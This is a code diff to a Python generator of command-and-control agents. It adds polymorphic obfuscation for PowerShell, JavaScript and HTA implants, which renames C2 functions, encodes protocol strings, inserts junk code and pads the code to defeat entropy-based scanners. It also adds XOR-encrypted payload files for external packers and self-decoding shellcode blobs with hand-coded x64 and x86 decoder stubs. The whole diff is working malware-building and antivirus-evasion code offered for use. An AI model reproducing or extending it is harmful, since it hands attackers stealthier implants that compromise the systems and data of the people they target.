@@ -9,6 +9,7 @@ import shutil
 import random
 import string
 import hashlib
+import struct
 from pathlib import Path
 
 
@@ -105,6 +106,44 @@ class AgentGenerator:
         # Verify entropy reduction
         new_entropy = self.calculate_shannon_entropy(content)
         print(f"[*] Entropy reduction: {current_entropy:.2f} -> {new_entropy:.2f}")
+
+        return content
+
+    def reduce_entropy_with_syntax(self, content: str, language: str) -> str:
+        """Reduce Shannon entropy using language-appropriate padding statements"""
+        current_entropy = self.calculate_shannon_entropy(content)
+
+        if current_entropy < 6.8:
+            return content
+
+        padding_words = [
+            'data', 'result', 'value', 'info', 'config', 'option', 'param', 'item',
+            'handler', 'manager', 'service', 'process', 'buffer', 'context', 'state',
+            'import', 'return', 'class', 'function', 'method', 'object', 'string'
+        ]
+
+        padding_vars = []
+        for _ in range(random.randint(10, 20)):
+            var_name = random.choice(padding_words) + '_' + random.choice(padding_words)
+            val = random.choice(padding_words)
+
+            if language == 'powershell':
+                padding_vars.append(f'${var_name} = "{val}"')
+            elif language == 'javascript':
+                padding_vars.append(f'const {var_name} = "{val}";')
+            elif language == 'vbscript':
+                padding_vars.append(f'Dim {var_name} : {var_name} = "{val}"')
+
+        lines = content.split('\n')
+        insert_point = min(5, len(lines))
+        for padding in padding_vars:
+            lines.insert(insert_point, padding)
+            insert_point += 1
+
+        content = '\n'.join(lines)
+
+        new_entropy = self.calculate_shannon_entropy(content)
+        print(f"[*] Entropy reduction ({language}): {current_entropy:.2f} -> {new_entropy:.2f}")
 
         return content
 
@@ -332,6 +371,429 @@ def {env_func}():
 
         return content
 
+    def obfuscate_powershell(self, content: str) -> str:
+        """Polymorphic obfuscation for PowerShell agents"""
+        import re
+        import base64
+
+        # 1. Strip comments: block comments <# ... #> then line comments #
+        content = re.sub(r'<#.*?#>', '', content, flags=re.DOTALL)
+        cleaned_lines = []
+        for line in content.split('\n'):
+            in_string = False
+            string_char = None
+            new_line = []
+            i = 0
+            while i < len(line):
+                ch = line[i]
+                if ch in ('"', "'") and (i == 0 or line[i-1] != '`'):
+                    if not in_string:
+                        in_string = True
+                        string_char = ch
+                    elif ch == string_char:
+                        in_string = False
+                        string_char = None
+                if ch == '#' and not in_string:
+                    break
+                new_line.append(ch)
+                i += 1
+            cleaned_lines.append(''.join(new_line).rstrip())
+        content = '\n'.join(line for line in cleaned_lines if line.strip())
+
+        # 2. String encode protocol strings with Base64
+        ps_strings = ['register', 'command', 'response', 'heartbeat', 'checkin']
+        for s in ps_strings:
+            encoded = base64.b64encode(s.encode()).decode()
+            replacement = f"([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{encoded}')))"
+            content = content.replace(f'"{s}"', replacement)
+
+        # 3. Function rename
+        func_map = {
+            'Invoke-XOREncryption': f'Invoke-{self.random_string(8)}',
+            'Invoke-XORDecryption': f'Invoke-{self.random_string(8)}',
+            'Get-SystemMetadata': f'Get-{self.random_string(8)}',
+            'Invoke-Command': f'Invoke-{self.random_string(8)}',
+            'Start-Agent': f'Start-{self.random_string(8)}',
+        }
+        for original, replacement in func_map.items():
+            pattern = re.compile(r'(?<!\w)' + re.escape(original) + r'(?!\w)')
+            content = pattern.sub(replacement, content)
+
+        # 4. Variable rename (sorted by length desc to prevent partial replacement)
+        var_map = {}
+        ps_vars = [
+            '$RECONNECT_DELAY', '$metadata', '$registerMsg', '$encrypted',
+            '$decrypted', '$buffer', '$received', '$response', '$output',
+            '$windowcode', '$uri', '$ws', '$ct', '$segment', '$task',
+            '$bytes', '$hwnd'
+        ]
+        for v in ps_vars:
+            var_map[v] = '$' + self.random_var_name()
+        # Sort by length desc
+        sorted_vars = sorted(var_map.items(), key=lambda x: len(x[0]), reverse=True)
+        # Exclusions
+        exclude_vars = {'$env:', '$PID', '$true', '$false', '$null'}
+        for original, replacement in sorted_vars:
+            # Use regex that won't match $env: prefix or other exclusions
+            escaped = re.escape(original)
+            pattern = re.compile(escaped + r'(?![a-zA-Z0-9_])')
+            content = pattern.sub(replacement, content)
+
+        # 5. Junk code before function declarations
+        lines = content.split('\n')
+        func_positions = [i for i, line in enumerate(lines) if line.strip().startswith('function ')]
+        num_junk = min(random.randint(2, 3), len(func_positions))
+        if func_positions and num_junk > 0:
+            positions = random.sample(func_positions, num_junk)
+            for pos in sorted(positions, reverse=True):
+                junk_var = '$' + self.random_var_name()
+                junk_type = random.choice([
+                    f'{junk_var} = Get-Random -Minimum 0 -Maximum 1000',
+                    f'{junk_var} = [System.DateTime]::Now.Ticks',
+                    f'{junk_var} = [System.Environment]::TickCount',
+                ])
+                lines.insert(pos, junk_type)
+        content = '\n'.join(lines)
+
+        # 6. Entropy reduce
+        content = self.reduce_entropy_with_syntax(content, 'powershell')
+
+        return content
+
+    def obfuscate_javascript(self, content: str) -> str:
+        """Polymorphic obfuscation for JavaScript agents"""
+        import re
+        import base64
+
+        # 1. Strip comments: block /* ... */ then line //
+        content = re.sub(r'/\*.*?\*/', '', content, flags=re.DOTALL)
+        cleaned_lines = []
+        for line in content.split('\n'):
+            in_string = False
+            string_char = None
+            new_line = []
+            i = 0
+            while i < len(line):
+                ch = line[i]
+                if ch in ("'", '"', '`') and (i == 0 or line[i-1] != '\\'):
+                    if not in_string:
+                        in_string = True
+                        string_char = ch
+                    elif ch == string_char:
+                        in_string = False
+                        string_char = None
+                if i < len(line) - 1 and line[i] == '/' and line[i+1] == '/' and not in_string:
+                    break
+                new_line.append(ch)
+                i += 1
+            cleaned_lines.append(''.join(new_line).rstrip())
+        content = '\n'.join(line for line in cleaned_lines if line.strip())
+
+        # 2. String encode protocol strings with Buffer.from base64
+        js_strings = ['register', 'command', 'response', 'heartbeat', 'checkin']
+        for s in js_strings:
+            encoded = base64.b64encode(s.encode()).decode()
+            replacement = f"Buffer.from('{encoded}', 'base64').toString()"
+            content = content.replace(f"'{s}'", replacement)
+
+        # 3. Function rename
+        func_map = {
+            'simpleEncrypt': self.random_var_name(),
+            'simpleDecrypt': self.random_var_name(),
+            'getMetadata': self.random_var_name(),
+            'executeCommand': self.random_var_name(),
+            'connectToC2': self.random_var_name(),
+        }
+        for original, replacement in func_map.items():
+            content = re.sub(r'\b' + re.escape(original) + r'\b', replacement, content)
+
+        # 4. Variable rename (skip output/response - conflict with JSON property keys)
+        js_vars = [
+            'RECONNECT_DELAY', 'registerMsg', 'heartbeatInterval',
+            'dataBuffer', 'encrypted', 'decrypted', 'uri'
+        ]
+        var_map = {}
+        for v in js_vars:
+            var_map[v] = self.random_var_name()
+        sorted_vars = sorted(var_map.items(), key=lambda x: len(x[0]), reverse=True)
+        for original, replacement in sorted_vars:
+            content = re.sub(r'\b' + re.escape(original) + r'\b', replacement, content)
+
+        # 5. Junk code before function/async function lines
+        lines = content.split('\n')
+        func_positions = [i for i, line in enumerate(lines)
+                         if line.strip().startswith('function ') or line.strip().startswith('async function')]
+        num_junk = min(random.randint(2, 3), len(func_positions))
+        if func_positions and num_junk > 0:
+            positions = random.sample(func_positions, num_junk)
+            for pos in sorted(positions, reverse=True):
+                junk_var = self.random_var_name()
+                junk_type = random.choice([
+                    f'const {junk_var} = Math.floor(Math.random() * 1000);',
+                    f'const {junk_var} = Date.now() % 1000;',
+                    f'const {junk_var} = process.pid || 0;',
+                ])
+                lines.insert(pos, junk_type)
+        content = '\n'.join(lines)
+
+        # 6. Entropy reduce
+        content = self.reduce_entropy_with_syntax(content, 'javascript')
+
+        return content
+
+    def obfuscate_hta(self, content: str) -> str:
+        """Polymorphic obfuscation for HTA (VBScript) agents"""
+        import re
+        import base64
+
+        # 1. Extract VBScript block from HTML wrapper
+        vbs_start_tag = '<script language="VBScript">'
+        vbs_end_tag = '</script>'
+        vbs_start = content.find(vbs_start_tag)
+        vbs_end = content.find(vbs_end_tag, vbs_start)
+        if vbs_start < 0 or vbs_end < 0:
+            return content
+
+        html_preamble = content[:vbs_start + len(vbs_start_tag)]
+        vbs_code = content[vbs_start + len(vbs_start_tag):vbs_end]
+        html_postamble = content[vbs_end:]
+
+        # 2. Strip VBScript comments (single-quote outside strings)
+        cleaned_lines = []
+        for line in vbs_code.split('\n'):
+            in_string = False
+            new_line = []
+            for ch in line:
+                if ch == '"':
+                    in_string = not in_string
+                if ch == "'" and not in_string:
+                    break
+                new_line.append(ch)
+            result = ''.join(new_line).rstrip()
+            if result.strip():
+                cleaned_lines.append(result)
+        vbs_code = '\n'.join(cleaned_lines)
+
+        # 3. Inject decoder function (Chr-based string reconstruction)
+        decoder_name = 'Fn' + self.random_string(8)
+        decoder_func = f'''
+        Function {decoder_name}(s)
+            Dim arr, i, result
+            arr = Split(s, ",")
+            result = ""
+            For i = 0 To UBound(arr)
+                result = result & Chr(CInt(arr(i)))
+            Next
+            {decoder_name} = result
+        End Function
+'''
+        # Insert decoder at top of VBS block
+        vbs_code = decoder_func + vbs_code
+
+        # 4. String encode - convert string literals to Chr() decoder calls
+        # Process longer strings first to avoid partial matches
+        # Handle VBS triple-quote patterns: """string""" -> """" & Decoder("ords") & """"
+        vbs_protocol_strings = [
+            'registered', 'checkin_ack', 'register', 'command', 'response',
+            'heartbeat', 'checkin', 'agent_id', 'metadata', 'hostname',
+            'username', 'domain', 'type', 'output', 'kill'
+        ]
+        vbs_protocol_strings.sort(key=len, reverse=True)
+
+        for s in vbs_protocol_strings:
+            ords = ','.join(str(ord(c)) for c in s)
+            # Triple-quote pattern: """string""" (VBS in HTA doubled quotes)
+            triple_pattern = '"""' + s + '"""'
+            triple_replacement = '"""" & ' + decoder_name + '("' + ords + '") & """"'
+            vbs_code = vbs_code.replace(triple_pattern, triple_replacement)
+            # Standalone double-quote pattern: "string"
+            standalone_pattern = '"' + s + '"'
+            standalone_replacement = decoder_name + '("' + ords + '")'
+            vbs_code = vbs_code.replace(standalone_pattern, standalone_replacement)
+
+        # 5. Function rename (case-insensitive, exclude Window_OnLoad)
+        func_map = {
+            'XOREncrypt': self.random_var_name(),
+            'XORDecrypt': self.random_var_name(),
+            'Base64Encode': self.random_var_name(),
+            'Base64Decode': self.random_var_name(),
+            'Stream_StringToBinary': self.random_var_name(),
+            'Stream_BinaryToString': self.random_var_name(),
+            'GetMetadata': self.random_var_name(),
+            'ExecuteCommand': self.random_var_name(),
+            'PollC2': self.random_var_name(),
+            'HandleResponse': self.random_var_name(),
+            decoder_name: self.random_var_name(),
+        }
+        # Rename decoder_name itself
+        actual_decoder_new = func_map[decoder_name]
+        for original, replacement in func_map.items():
+            pattern = re.compile(r'\b' + re.escape(original) + r'\b', re.IGNORECASE)
+            vbs_code = pattern.sub(replacement, vbs_code)
+
+        # Fix setTimeout string reference: "PollC2" was already renamed in code,
+        # but the string "PollC2" in window.setTimeout needs updating
+        poll_new_name = func_map['PollC2']
+        # The setTimeout uses a string reference like: window.setTimeout "PollC2", 5000
+        # After function rename, the string literal "PollC2" won't have been caught by \b regex
+        # because it's inside quotes. Check if original string still exists.
+        vbs_code = vbs_code.replace('"PollC2"', f'"{poll_new_name}"')
+        # Case-insensitive version
+        vbs_code = re.sub(r'"PollC2"', f'"{poll_new_name}"', vbs_code, flags=re.IGNORECASE)
+
+        # 6. Variable rename (case-insensitive, sorted by length desc)
+        vbs_vars = [
+            'g_AgentId', 'g_C2Url', 'wshNetwork', 'wshShell', 'oExec',
+            'payload', 'encrypted', 'responseText', 'decrypted', 'jsonStr',
+            'errOutput', 'resultPayload', 'encResult', 'oXML', 'oNode',
+            'BinaryStream', 'idStart', 'idEnd', 'cmdStart', 'cmdEnd'
+        ]
+        var_map = {}
+        for v in vbs_vars:
+            var_map[v] = self.random_var_name()
+        sorted_vars = sorted(var_map.items(), key=lambda x: len(x[0]), reverse=True)
+        for original, replacement in sorted_vars:
+            pattern = re.compile(r'\b' + re.escape(original) + r'\b', re.IGNORECASE)
+            vbs_code = pattern.sub(replacement, vbs_code)
+
+        # 7. Junk code before Function/Sub declarations
+        lines = vbs_code.split('\n')
+        func_positions = [i for i, line in enumerate(lines)
+                         if line.strip().lower().startswith('function ') or line.strip().lower().startswith('sub ')]
+        # Exclude the decoder function we just injected (first function)
+        if func_positions:
+            func_positions = func_positions[1:]
+        num_junk = min(random.randint(2, 3), len(func_positions))
+        if func_positions and num_junk > 0:
+            positions = random.sample(func_positions, num_junk)
+            for pos in sorted(positions, reverse=True):
+                junk_var = self.random_var_name()
+                junk_type = random.choice([
+                    f'        Dim {junk_var} : {junk_var} = Int(Rnd * 1000)',
+                    f'        Dim {junk_var} : {junk_var} = Timer',
+                    f'        Dim {junk_var} : {junk_var} = Int(Rnd * 500) + 1',
+                ])
+                lines.insert(pos, junk_type)
+        vbs_code = '\n'.join(lines)
+
+        # 8. Reassemble HTML + obfuscated VBS
+        content = html_preamble + vbs_code + html_postamble
+
+        # 9. Entropy reduce
+        content = self.reduce_entropy_with_syntax(content, 'vbscript')
+
+        return content
+
+    def generate_bin_payload(self, agent_path: str, payload_type: int) -> str:
+        """Generate XOR-encrypted .bin payload for external packer consumption
+
+        Binary format:
+            [4 bytes]  Magic: 0x53 0x50 0x42 0x4E ("SPBN")
+            [1 byte]   Type: 0x01=ps1, 0x02=js, 0x03=hta, 0x04=py
+            [16 bytes] XOR key (os.urandom)
+            [4 bytes]  Original length (LE uint32)
+            [N bytes]  XOR-encrypted payload
+
+        Args:
+            agent_path: Path to the generated agent file
+            payload_type: Type byte (0x01-0x04)
+
+        Returns:
+            Path to the generated .bin file
+        """
+        with open(agent_path, 'rb') as f:
+            payload = f.read()
+
+        xor_key = os.urandom(16)
+        encrypted = bytes(b ^ xor_key[i % 16] for i, b in enumerate(payload))
+
+        bin_path = agent_path + '.bin'
+        with open(bin_path, 'wb') as f:
+            f.write(b'\x53\x50\x42\x4E')                    # Magic: SPBN
+            f.write(struct.pack('B', payload_type))           # Type byte
+            f.write(xor_key)                                  # 16-byte XOR key
+            f.write(struct.pack('<I', len(payload)))          # Original length (LE)
+            f.write(encrypted)                                # XOR-encrypted payload
+
+        return bin_path
+
+    def generate_raw_shellcode_blob(self, agent_path: str, payload_type: int, arch: str = 'x64') -> str:
+        """Generate self-decoding shellcode blob with inline XOR decoder stub
+
+        Blob layout:
+            [stub bytes] XOR decoder (position-independent, jumps over key/len after decode)
+            [16 bytes]   XOR key
+            [4 bytes]    Payload length (LE)
+            [N bytes]    XOR-encrypted payload
+
+        The stub uses call/pop to get RIP/EIP-relative addressing, then XOR-decodes
+        the payload in-place. After decoding, execution falls through to the raw payload.
+
+        Args:
+            agent_path: Path to the generated agent file
+            payload_type: Type byte (unused in blob, kept for API consistency)
+            arch: Target architecture ('x64' or 'x86')
+
+        Returns:
+            Path to the generated .sc.bin file
+        """
+        with open(agent_path, 'rb') as f:
+            payload = f.read()
+
+        xor_key = os.urandom(16)
+        encrypted = bytes(b ^ xor_key[i % 16] for i, b in enumerate(payload))
+        payload_len = len(payload)
+
+        if arch == 'x64':
+            # x64 decoder stub (~30 bytes):
+            # call $+5 / pop rsi (get RIP) / lea rsi, [rsi + offset_to_key]
+            # mov ecx, [rsi+16] (payload length) / lea rdi, [rsi+20] (payload start)
+            # xor loop: xor byte [rdi+rcx-1], byte [rsi + (rcx-1)%16] / dec rcx / jnz loop
+            stub = bytearray([
+                0xE8, 0x00, 0x00, 0x00, 0x00,              # call $+5
+                0x5E,                                        # pop rsi (rsi = addr of pop)
+                0x48, 0x83, 0xC6, 0x1E,                     # add rsi, 30 (offset to key data)
+                0x8B, 0x4E, 0x10,                            # mov ecx, [rsi+16] (payload len)
+                0x48, 0x8D, 0x7E, 0x14,                     # lea rdi, [rsi+20] (payload start)
+                # XOR decode loop:
+                0x89, 0xC8,                                  # mov eax, ecx
+                0xFF, 0xC8,                                  # dec eax
+                0x83, 0xE0, 0x0F,                            # and eax, 0x0F (key index)
+                0x8A, 0x14, 0x06,                            # mov dl, [rsi+rax] (key byte)
+                0x30, 0x54, 0x0F, 0xFF,                      # xor [rdi+rcx-1], dl
+                0xE2, 0xF2,                                  # loop (dec ecx, jnz -14)
+                # Fall through to payload via jmp
+                0xEB, 0x14,                                  # jmp +20 (skip key+len, land on payload)
+            ])
+        else:
+            # x86 decoder stub (~25 bytes):
+            stub = bytearray([
+                0xE8, 0x00, 0x00, 0x00, 0x00,              # call $+5
+                0x5E,                                        # pop esi (esi = addr of pop)
+                0x83, 0xC6, 0x19,                            # add esi, 25 (offset to key data)
+                0x8B, 0x4E, 0x10,                            # mov ecx, [esi+16] (payload len)
+                0x8D, 0x7E, 0x14,                            # lea edi, [esi+20] (payload start)
+                # XOR decode loop:
+                0x89, 0xC8,                                  # mov eax, ecx
+                0x48,                                        # dec eax
+                0x83, 0xE0, 0x0F,                            # and eax, 0x0F
+                0x8A, 0x14, 0x06,                            # mov dl, [esi+eax]
+                0x30, 0x54, 0x0F, 0xFF,                      # xor [edi+ecx-1], dl
+                0xE2, 0xF4,                                  # loop -12
+                0xEB, 0x14,                                  # jmp +20 (skip key+len)
+            ])
+
+        blob = bytearray(stub)
+        blob.extend(xor_key)                                  # 16-byte XOR key
+        blob.extend(struct.pack('<I', payload_len))           # Payload length
+        blob.extend(encrypted)                                # XOR-encrypted payload
+
+        sc_path = agent_path + '.sc.bin'
+        with open(sc_path, 'wb') as f:
+            f.write(bytes(blob))
+
+        return sc_path
+
     def generate_unique_encryption_key(self) -> str:
         """Generate unique encryption key for each agent"""
         random_bytes = os.urandom(16)
@@ -526,6 +988,9 @@ def {cmd_func}(cmd):
         content = content.replace("{{C2_PORT}}", str(c2_port))
         content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)
 
+        # Apply polymorphic obfuscation
+        content = self.obfuscate_powershell(content)
+
         # Save agent
         output_file = self.output_dir / f"agent_{self.random_string(6)}.ps1"
         with open(output_file, 'w') as f:
@@ -548,6 +1013,9 @@ def {cmd_func}(cmd):
         content = content.replace("{{C2_PORT}}", str(c2_port))
         content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)
 
+        # Apply polymorphic obfuscation
+        content = self.obfuscate_javascript(content)
+
         # Save agent
         output_file = self.output_dir / f"agent_{self.random_string(6)}.js"
         with open(output_file, 'w') as f:
@@ -569,6 +1037,9 @@ def {cmd_func}(cmd):
         content = content.replace("{{C2_HOST}}", c2_host)
         content = content.replace("{{C2_PORT}}", str(c2_port))
         content = content.replace("{{ENCRYPTION_KEY}}", encryption_key)
+
+        # Apply polymorphic obfuscation
+        content = self.obfuscate_hta(content)
 
         # Save agent
         output_file = self.output_dir / f"agent_{self.random_string(6)}.hta"
@@ -1135,7 +1606,8 @@ unsigned int {var_name}_len = {len(data)};
                      beacon_mode: bool = False, beacon_interval: int = 60, beacon_jitter: int = 0,
                      compile_exe: bool = False, compile_dll: bool = False, generate_shellcode: bool = False,
                      shellcode_format: str = 'raw', architectures: list = None, upx: bool = True, icon: str = None,
-                     target_os: str = 'auto', generate_multi_os: bool = False, unique_key: bool = False) -> dict:
+                     target_os: str = 'auto', generate_multi_os: bool = False, unique_key: bool = False,
+                     generate_bin: bool = False, raw_shellcode: bool = False) -> dict:
         """Generate agents for all platforms
 
         Args:
@@ -1203,6 +1675,49 @@ unsigned int {var_name}_len = {len(data)};
         except Exception as e:
             results['hta'] = f"Error: {str(e)}"
             print(f"[-] HTA agent failed: {str(e)}")
+
+        # Generate raw .bin payloads for external packers
+        if generate_bin:
+            type_map = {'powershell': 0x01, 'javascript': 0x02, 'hta': 0x03}
+            for key, path in list(results.items()):
+                if isinstance(path, str) and path.startswith('Error'):
+                    continue
+                if key.startswith('python'):
+                    ptype = 0x04
+                elif key in type_map:
+                    ptype = type_map[key]
+                else:
+                    continue
+                try:
+                    bin_path = self.generate_bin_payload(path, ptype)
+                    results[f'bin_{key}'] = bin_path
+                    print(f"[+] Binary payload generated: {bin_path}")
+                except Exception as e:
+                    results[f'bin_{key}'] = f"Error: {str(e)}"
+                    print(f"[-] Binary payload failed for {key}: {str(e)}")
+
+        # Generate self-decoding shellcode blobs
+        if raw_shellcode:
+            type_map = {'powershell': 0x01, 'javascript': 0x02, 'hta': 0x03}
+            sc_arch = architectures[0] if architectures else 'x64'
+            for key, path in list(results.items()):
+                if isinstance(path, str) and path.startswith('Error'):
+                    continue
+                if key.startswith('bin_'):
+                    continue
+                if key.startswith('python'):
+                    ptype = 0x04
+                elif key in type_map:
+                    ptype = type_map[key]
+                else:
+                    continue
+                try:
+                    sc_path = self.generate_raw_shellcode_blob(path, ptype, arch=sc_arch)
+                    results[f'sc_{key}'] = sc_path
+                    print(f"[+] Shellcode blob generated ({sc_arch}): {sc_path}")
+                except Exception as e:
+                    results[f'sc_{key}'] = f"Error: {str(e)}"
+                    print(f"[-] Shellcode blob failed for {key}: {str(e)}")
 
         # Compile Python agents to executables
         if compile_exe:
@@ -1836,6 +2351,10 @@ if __name__ == '__main__':
                        help='Target operating system (default: auto = current platform)')
     parser.add_argument('--multi-os', dest='multi_os', action='store_true',
                        help='Generate agents for all operating systems (Windows, Linux, macOS)')
+    parser.add_argument('--bin', action='store_true',
+                       help='Generate raw .bin payloads for packer consumption')
+    parser.add_argument('--raw-shellcode', dest='raw_shellcode', action='store_true',
+                       help='Generate self-decoding shellcode blobs')
     parser.add_argument('--oneliners', type=str, metavar='URL',
                        help='Generate one-liner payloads for delivery (provide payload URL)')
 
@@ -1851,7 +2370,8 @@ if __name__ == '__main__':
         beacon_mode=args.beacon, beacon_interval=args.interval, beacon_jitter=args.jitter,
         compile_exe=args.compile, compile_dll=args.dll, generate_shellcode=args.shellcode,
         shellcode_format=args.format, architectures=args.arch, upx=not args.no_upx,
-        icon=args.icon, target_os=args.target_os, generate_multi_os=args.multi_os
+        icon=args.icon, target_os=args.target_os, generate_multi_os=args.multi_os,
+        generate_bin=args.bin, raw_shellcode=args.raw_shellcode
     )
 
     print("\n" + "="*60)
